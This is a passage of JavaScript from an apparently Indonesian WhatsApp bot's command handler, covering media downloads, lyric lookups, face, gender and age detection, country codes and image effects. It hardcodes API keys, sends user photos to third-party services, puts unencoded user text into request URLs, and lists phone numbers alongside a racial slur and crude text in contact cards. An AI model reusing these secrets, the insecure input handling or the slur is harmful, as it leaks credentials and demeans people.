   case 'ytmp4':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/uodAdkNAd10`)
                    query = body.slice(7)
                    Manikkk = await fetchJson(`https://api.zeks.xyz/api/${command}?url=${query}&apikey=apivinz`)
                    Manikkk = Manikkk.result
                     nikk =`TITLE = ${Manikkk.title}\nSIZE = ${Manikkk.size}`
                    gambary = await getBuffer(Manikkk.thumbnail)
                    zacky.sendMessage(from, gambary, image, { quoted: mek, caption: nikk })
                    get_audio = await getBuffer(Manikkk.url_audio)
                    zacky.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${Manikkk.title}.mp3`, quoted: mek})
                    get_video = await getBuffer(Manikkk.url_video)
                    zacky.sendMessage(from, get_video, video, { mimetype: 'video/mp4', filename: `${Manikkk.title}.mp4`, quoted: mek})                    
                    break
				    case 'chord':    
               			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
              			if (isLimit(sender)) return reply(ind.limitend(pusname))
                		reply(ind.wait)
					teks = body.slice(7)
					anu = await fetchJson(`https://videfikri.com/api/chord/?query=${teks}`, {method: 'get'})
					reply('chord dari lagu '+teks+' adalah :\n\n'+anu.result.chord)
					await limitAdd(sender) 
					break
case 'muihalal':
					if (args.length < 1) return reply('Apa yang mau dicari?')
					anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/halal?q=${body.slice(10)}&apikey=${leysKey}`, {method: 'get'})
					anu = anu.result
					hasill = `hasil : ${anu.hasil}`
					zacky.sendMessage(from, hasill, text, {quoted: mek})
					break
				    case 'lirik':    
               			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
              			if (isLimit(sender)) return reply(ind.limitend(pusname))
                		reply(ind.wait)
					teks = body.slice(7)
					anu = await fetchJson(`http://scrap.terhambar.com/lirik?word=${teks}`, {method: 'get'})
					reply('Lirik dari lagu '+teks+' adalah :\n\n'+anu.result.lirik)
					await limitAdd(sender) 
					break 
					// Information //
    case 'deteksiwajah':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	if (isLimit(sender)) return reply(ind.limitend(pusname))
	if (isLimit(sender)) return reply(ind.limitend(pusname))
	if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`http://lolhuman.herokuapp.com/api/facedetect?apikey=${lolkey}&img=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'deteksigender':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	if (isLimit(sender)) return reply(ind.limitend(pusname))
	if (isLimit(sender)) return reply(ind.limitend(pusname))
	if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await fetchJson(`http://lolhuman.herokuapp.com/api/genderdetect?apikey=${lolkey}&img=${anu.display_url}`)
	  gender = `[ DETEKSI GENDER ] \nMenurut bot.. seseorang di gambar bergender = *${hehe.result}*\n\nFEMALE = PEREMPUAN\nMALE = LAKI-LAKI`
	 zacky.sendMessage(from, gender, text, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'deteksiumur':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	if (isLimit(sender)) return reply(ind.limitend(pusname))
	if (isLimit(sender)) return reply(ind.limitend(pusname))
	if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await fetchJson(`http://lolhuman.herokuapp.com/api/agedetect?apikey=${lolkey}&img=${anu.display_url}`)
	  gender = `[ DETEKSI UMUR ] \nMenurut bot.. seseorang di gambar tersebut berumur = *${hehe.result}*`
	 zacky.sendMessage(from, gender, text, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	            case 'test':	            
				case 'ping':
				case 'sinyal':
				if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')				
                zacky.sendMessage(from, `Speed saat ini:\n${process.uptime()}`, text, {quoted: freply, contextInfo: { forwardingScore: 1000, isForwarded: true }})
					   break
					   case 'donasi':
		               case 'donate':
                       if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                       if (isBanned) return reply('Maaf kamu sudah terbenned!')
				       if (isLimit(sender)) return reply(ind.limitend(pusname))
				       wew = fs.readFileSync(`./lib/♡.jpeg`)
teks = `*DONASI BRO*
*GOPAY* : 085236483504
*PULSA* : 085236483504
*SAWERIA* : https://saweria.co/YourMom
*Ig owner* : www.instagram.com/lord_zacky69`
					   zacky.sendMessage(from, wew, image, { quoted: freply, caption: teks, contextInfo: { forwardingScore: 1000, isForwarded: true }})  
					   break
				  case 'owner':
res = await zacky.prepareMessageFromContent(from,{
"contactsArrayMessage": {
"displayName": "3 kontak",	
"contacts": [
{
"displayName": "D∅NZ",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Donz;;;\nFN:D∅NZ\nORG:Tidak dapat bokep, coli saja\nitem1.TEL;waid=62822281112305:+62822281112305\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
},
{
"displayName": "YNTKTS",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:YNTKTS;;;\nFN:YNTKTS\nORG:Ching Chong\nitem1.TEL;waid=62822281112309:+62822281112309\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
},
{
"displayName": "Rizki",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Rizki;;;\nFN:Rizki\nORG:Turu\nitem1.TEL;waid=6285236483504:+6285236483504\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
}
]
}
}, { quoted: mek, contextInfo: {forwardingScore: 1000, isForwarded: true}})
zacky.relayWAMessage(res)
break
					   case 'infoowner':
		               case 'infodeveloper':
		               case 'infopengembang':
                       if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				       if (isLimit(sender)) return reply(ind.limitend(pusname))
				const srd = "6285737134572@s.whatsapp.net"
				const bjir = `
╔════ ◤ *Info Developer* ◢
║╔▸ 
║╠ *Nama* : ManikGanz
║╠ *Nomer* : wa.me/6285737134572
║╠ *Github* : Cari Sendiri!?
║╠ *Tag Owner* : @${srd.split("@")[0]}
║╠ *Yutub* : 「 ᴍᴀɴɪᴋ ᴏғғɪᴄɪᴀʟツ 」
║╠ *Ig* : @mekManik___
║╚▸
╚════ ◤ *${NamaBot}* ◢`
					   zacky.sendMessage(from, bjir, text, { quoted: ftoko, contextInfo: {"mentionedJid": [srd], forwardingScore: 1000, isForwarded: true }})
					   break
					   case 'bahasa':
					case 'kodenegara':
					// Fix Case By Manik
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.sendMessage(from, `*A*
Afganistan 93
Afrika Selatan 27
Afrika Tengah 236
Albania 355
Algeria (Aljazair) 213
Amerika Serikat 1
Andorra 376
Angola 244
Anguila 1-264
Antigua 1-268
Antillen Belanda 599
Arab Saudi 966
Argentina 54
Armenia 374
Aruba 297
Australia 61
Austria 43
Azerbaijan 994

*B*
Bahama 1-242
Bahrain 973
Bangladesh 880
Barbados 1-246
Barbuda 1-268
Belanda 31
Belarus 375
Belgia 32
Belize 501
Benin 229
Bermuda 1-441
Bhutan 975
Bolivia 591
Bosnia dan Herzegovina 387
Botswana 267
Brasil 55
Brunei Darussalam 673
Bulgaria 359
Burkina Faso 226
Burundi 257

*C*
Cape Verde 238
Ceko 420
Chad 235
Chili 56
Cina 86
Cina Makau 853

*D*
Denmark 45
Djibouti 253
Domikia 1-767

*E*
Ekuador 593
El Salvador 503
Eritrea 291
Estonia 372
Ethiopia 251

*F*
Fiji 679
Filipina 63
Finlandia 358

*G*
Gabon 241
Gambia 220
Georgia 995
Ghana 233
Gibraltar 350
Greenland 299
Grenada 1-473
Guam 1-671
Guatemala 502
Guinea 224
Guinea Bissau 245
Guinea Ekuator 240
Guyana 592

*H*
Haiti 509
Honduras 504
Hongaria 36
Hongkong 852

*I*
Indonesia 62
India 91
Inggris (Britania Raya) 44
Irak 964
Iran 98
Irlandia 353
Islandia 354
Israel 972
Italia 39

*J*
Jamaika 1-876
Jepang 81
Jerman 49
Jersey 44-1534

*K*
Kamboja 855
Kamerun 237
Kanada 1
Kazakhstan 7
Kenya 254
Kepulauan Marshall 692
Kepulauan Turks dan Caicos 1-649
Kirgizstan 996
Kiribati 686
Kolombia 57
Komoros 682
Korea Selatan 82
Korea Utara 850
Kosta Rika 506
Kroasia 385
Kuba 53
Kuwait 965
Kurakao 599

*L*
Laos 856
Latvia 371
Lebanon 961
Lesotho 266
Liberia 231
Libya 218
Liechtenstein 423
Lituania 370
Luksemburg 352

*M*
Madagaskar 261
Makedonia 389
Maladewa 960
Malawi 265
Malaysia 60
Mali 223
Malta 356
Maroko 212
Mauritania 222
Mauritius 230
Mayotte 262
meksiko 52
Mesir 20
Mikronesia 691
Moldova 373
Monako 377
Mongolia 976
Montenegro 382
Mozambik 258
Myanmar 95

*N*
Namibia 264
Nauru 674
Nepal 977
Niger 227
Nigeria 234
Nikaragua 505
Niue 683
Norwegia 47

*O*
Oman 968

*P*
Pakistan 92
Palau 680
Palestina 970
Panama 507
Pantai Gading 225
Papua Nugini 675
Paraguay 595
Perancis 33
Perancis Polinesia 689
Peru 51
Pitcairn 64
Polandia 48
Portugal 351
Puerto Riko 1-787, 1-939
Pulau Cocos 61
Pulau Cook 682
Pulau Falkland 500
Pulau Faroe 298
Pulau Man 44-1624
Pulau Mariana Utara 1-670
Pulau Reuni 262
Pulau Solomon 677
Pulau Virgin 1-340

*Q*
Qatar 974

*R*
Republik Ceko 420
Republik Demokrasi Kongo 243
Republik Dominika 1-809, 1-829, 1-849
Rumania 40
Rusia 7
Rwanda 250

*S*
Sahara Barat 212
Santo Barthelemy 590
Santo Helena 290
Santo Kitts dan Nevis 1-869
Santo Lucia 1-758
Santo Vincent dan Grenadines 1-784
Samoa 685
San Marino 378
Sao Tome dan Principe 239
Selandia Baru 64
Senegal 221
Serbia 381
Seychelles 248
Sierra Leone 232
Singapura 65
Siprus 357
Slovenia 386
Slowakia 421
Somalia 252
Spanyol 34
Sri Lanka 94
Sudan 249
Sudan 211
Suriah 963
Suriname 597
Svalbard dan Jan Mayen 47
Swaziland 268
Swedia 46
Swiss 41

*T*
Tajikistan 992
Tanjung Verde 238
Tanzania 255
Taiwan 886
Thailand 66
Timor Leste 670
Togo 228
Tokelau 690
Tonga 676
Trinidad dan Tobago 1-868
Tunisia 216
Turki 90
Turkmenistan 993
Tuvalu 688

*U*
Uganda 256
Ukraina 380
Uni Emirat Arab 971
Uruguay 598
Uzbekistan 998

*V*
Vanuatu 678
Vatican 379
Venezuela 58
Vietnam 84

*W*
Walls dan Futuna 681

*Y*
Yaman 967
Yunani 30
Yordania 962

*Z*
Zambia 260
Zimbabwe 263`, text, { quoted: ftoko})
					await limitAdd(sender)
					break					
                
//REQ-REP BY Manik
case 'request':
                if (isBanned) return reply('Maaf kamu sudah terbenned!')
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                if (args.length < 1) return reply(`Mau request apa? Contoh: ${prefix}request fitur anime`)
          				
                     const cfrr = body.slice(8)
                      if (cfrr.length > 300) return zacky.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
                        var tonor = mek.participant
                       const ress = `*[REQUEST]*\nNomor : @${tonor.split("@s.whatsapp.net")[0]}\nPesan : ${cfrr}`

                      var options = {
                         text: ress,
                         contextInfo: {mentionedJid: [tonor]},
                     }
                    zacky.sendMessage('6285737134572@s.whatsapp.net', options, text, {quoted: mek})
                    reply('REQUEST ANDA TELAH SAMPAI ke owner BOT, Requests palsu/main2 tidak akan ditanggapi.')
                    break
                     case 'bugreport':
                if (isBanned) return reply('Maaf kamu sudah terbenned!')
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                if (args.length < 1) return reply(`Mau lapor apa? Contoh: ${prefix}lapor fitur anime error`)
          			
          				const kontil = body.slice(11)
                      if (kontil.length > 300) return zacky.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
                        var tonmor = mek.participant
                       const buseh = `*[BUG REPORT]*\nNomor : @${tonmor.split("@s.whatsapp.net")[0]}\nPesan : ${kontil}`

                      var options = {
                         text: buseh,
                         contextInfo: {mentionedJid: [tonmor]},
                     }
                    zacky.sendMessage('6285737134572@s.whatsapp.net', options, text, {quoted: mek})
                    reply('LAPORAN ANDA TELAH SAMPAI ke owner BOT, Laporan palsu/main2 tidak akan ditanggapi.')
                    break
                    //NEW SOVIET BY Manik
		case 'lenin':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=lenin`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime2k1 =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime2k1)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					
					case 'kalashnikov':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=kalashnikov`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime1k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime1k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'unisoviet':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=kalashnikov`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime3k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime3k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'nikitakhrushchev':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=nikita khrushchev`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime7k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime7k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'andreigromyko':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=andrei gromyko`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime4k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime4k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'andreigromyko':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=andrei gromyko`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime6k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime6k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'yurigagarin':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=yuri gagarin`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime8k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime8k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'T-34':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=T-34`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime5k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime5k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'YAK-3':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=YAK-3`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime15k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime15k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'YAK-9':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=YAK-9`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime14k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime14k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'LA-7':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=LA-7`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime13k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime13k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'ak47':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=ak47`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime12k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime12k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'katyusha':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Katyusha`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime11k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime11k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'mig-15':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=mig-15`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime10k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime10k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'rpg-7':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=rpg-7`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nime9k =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nime9k)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
//New Image Menu
case 'amongus':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nContoh: ${prefix + command} Manik`)
                    buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/amongus?apikey=${lolkey}&text=${body.slice(9)}`)
                    zacky.sendMessage(from, buffer, sticker, { quoted: mek})
                    break
case 'webmatrix':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply(ind.wrongf())
					aruga = body.slice(11)
					reply(ind.wait())
					aruga = await getBuffer(`https://api.xteam.xyz/photooxy/underwebmatrix?text=${aruga}&APIKEY=${xteamkey}`)
					zacky.sendMessage(from, aruga, image, {quoted: ftoko})
					await limitAdd(sender)
					break 
					case 'redglass':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply(ind.wrongf())
					aruga = body.slice(10)
					reply(ind.wait())
					aruga = await getBuffer(`https://api.xteam.xyz/textpro/redglass?text=${aruga}&APIKEY=${xteamkey}`)
					zacky.sendMessage(from, aruga, image, {quoted: ftoko})
					await limitAdd(sender)
					break 
case 'facebookpage':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/facebookprof/?urlgbr=${anu.display_url}&text=${tels}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'costumwp':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/customwp/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'pantaimalam':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/nightbeach/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'pencil':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/pencil/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'bakar':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/burneffect/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'crossgun':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/crossgun/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'hitler':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
